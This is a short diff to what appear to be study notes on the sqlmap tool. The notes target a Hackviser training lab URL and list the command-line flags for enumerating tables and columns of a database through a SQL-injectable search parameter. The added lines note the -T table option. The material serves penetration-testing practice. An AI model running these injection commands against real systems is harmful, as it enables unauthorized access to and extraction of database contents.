@@ -52,6 +52,9 @@ We will use the --tables parameter to detect tables present in the database mana
 If we want to list tables in a specific database instead of all databases, we need to specify the database using the -D parameter.
 : -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --tables -D ecliptica_cars
 
+** select table
+Use the parameter ~-T~
+
 ** listing table columns
 We will use the --columns parameter to detect the table columns in a database. If we want to list the tables in a specific database, we need to specify the database using the -D parameter.
 : sqlmap -u "https://bursting-bulletgirl.europe1.hackviser.space/?search=test" --columns -D ecliptica_cars
